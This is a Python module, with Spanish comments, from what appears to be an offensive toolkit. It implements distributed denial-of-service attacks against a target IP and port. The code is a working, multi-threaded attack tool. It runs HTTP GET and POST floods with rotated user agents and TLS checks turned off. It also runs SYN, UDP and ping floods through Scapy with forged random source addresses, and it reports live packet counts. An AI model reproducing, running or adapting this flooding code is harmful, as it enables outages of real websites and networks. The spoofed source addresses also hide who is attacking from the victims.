"""
Módulo DDOS - Lógica de inundación de paquetes
"""

import time
import random
import threading
import urllib.request
import ssl
import os
from modulos.config import _estado, DIR_BASE

class DDOSModule:
    """Módulo para ataques DDoS locales y Capa 7 HTTP."""
    
    def __init__(self, logger_engine):
        self.logger = logger_engine
        self.user_agents = self._load_user_agents()
        
    def _load_user_agents(self):
        ua_file = os.path.join(DIR_BASE, "data", "useragents.txt")
        if os.path.exists(ua_file):
            try:
                with open(ua_file, "r", encoding="utf-8") as f:
                    return [line.strip() for line in f if line.strip()]
            except Exception:
                pass
        return ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"]

    def start_attack(self, ip_target, port, mode, threads, use_ua_rotation, write_callback, stop_callback):
        """Inicia el ataque DDoS."""
        needs_scapy = mode not in ["HTTP GET Flood", "HTTP POST Flood"]
        if needs_scapy:
            if not hasattr(self, '_scapy_available'):
                try:
                    from scapy.all import IP, TCP, UDP, ICMP, Raw, send
                    self._scapy_available = True
                except ImportError:
                    self._scapy_available = False
                    write_callback("✗ Scapy no disponible.\n")
                    return False
            if not self._scapy_available:
                return False
                
        _estado["ddos"].set()
        threading.Thread(target=self._ddos_loop, args=(ip_target, port, mode, threads, use_ua_rotation, write_callback, stop_callback), daemon=True).start()
        return True
    
    def stop_attack(self, write_callback):
        """Detiene el ataque DDoS."""
        _estado["ddos"].clear()
        write_callback("● Ataque detenido.\n")
        self.logger.log("[DDoS] Detenido.", "warn")
    
    def _ddos_worker_http(self, url, method, use_ua_rotation, workers, write_callback):
        """Worker concurrente mejorado para envío HTTP rápido (Capas 7)."""
        import requests
        from requests.adapters import HTTPAdapter
        import urllib3
        
        # Desactivar warnings de SSL
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        session = requests.Session()
        # Pool de conexiones para máxima concurrencia
        adapter = HTTPAdapter(pool_connections=workers, pool_maxsize=workers * 2)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        def _send_req():
            while _estado["ddos"].is_set():
                headers = {}
                if use_ua_rotation and self.user_agents:
                    headers['User-Agent'] = random.choice(self.user_agents)
                
                try:
                    if method == "HTTP GET Flood":
                        session.get(url, headers=headers, timeout=2, verify=False)
                    else:
                        session.post(url, headers=headers, data={"foo": "bar", "bypass": random.randint(1,10000)}, timeout=2, verify=False)
                    if hasattr(self, '_pkt_count'):
                        self._pkt_count += 1
                except Exception:
                    pass

        import concurrent.futures
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(_send_req) for _ in range(workers)]
            concurrent.futures.wait(futures)

    def _ddos_worker_scapy(self, ip_target, port, mode):
        """Worker tradicional para envío de paquetes Scapy (Capas 3/4)."""
        try:
            from scapy.all import IP, TCP, UDP, ICMP, Raw, send
        except ImportError:
            return

        while _estado["ddos"].is_set():
            try:
                src = ".".join(str(random.randint(1,254)) for _ in range(4))
                if mode == "SYN Flood":
                    pkt = IP(src=src, dst=ip_target) / TCP(
                        sport=random.randint(1024,65535), dport=port, flags="S", seq=random.randint(0,2**32-1)
                    )
                elif mode == "Ping Flood":
                    pkt = IP(src=src, dst=ip_target) / ICMP() / Raw(load=b"X"*500)
                else:  # UDP Flood
                    pkt = IP(src=src, dst=ip_target) / UDP(
                        sport=random.randint(1024,65535), dport=port
                    ) / Raw(load=b"A"*500)
                send(pkt, verbose=0)
                if hasattr(self, '_pkt_count'):
                    self._pkt_count += 1
            except Exception:
                pass

    def _ddos_loop(self, ip_target, port, mode, threads, use_ua_rotation, write_callback, stop_callback):
        """Loop supervisor del ataque DDoS multi-hilo."""
        write_callback(f"» {mode} → {ip_target}:{port} [{threads} Threads]\n" + "─"*44 + "\n")
        self.logger.log(f"[DDoS] {mode} iniciado ({threads}T) → {ip_target}:{port}", "warn")
        
        self._pkt_count = 0
        workers = threads
        
        is_http = mode in ["HTTP GET Flood", "HTTP POST Flood"]
        
        if is_http:
            url = f"http://{ip_target}:{port}"
            if port == 443:
                url = f"https://{ip_target}:{port}"
            # Usar el worker HTTP optimizado en un hilo separado
            threading.Thread(target=self._ddos_worker_http, args=(url, mode, use_ua_rotation, workers, write_callback), daemon=True).start()
        else:
            # Usar los workers de scapy
            for _ in range(workers):
                threading.Thread(target=self._ddos_worker_scapy, args=(ip_target, port, mode), daemon=True).start()
        
        try:
            while _estado["ddos"].is_set():
                time.sleep(0.5)
                write_callback(f"  ↗ ~{self._pkt_count} reqs/pkts enviados → {ip_target}\n")
        except Exception as e:
            write_callback(f"✗ Error: {e}\n")
            self.logger.log(f"[DDoS] Error: {e}", "err")
        finally:
            _estado["ddos"].clear()
            stop_callback()
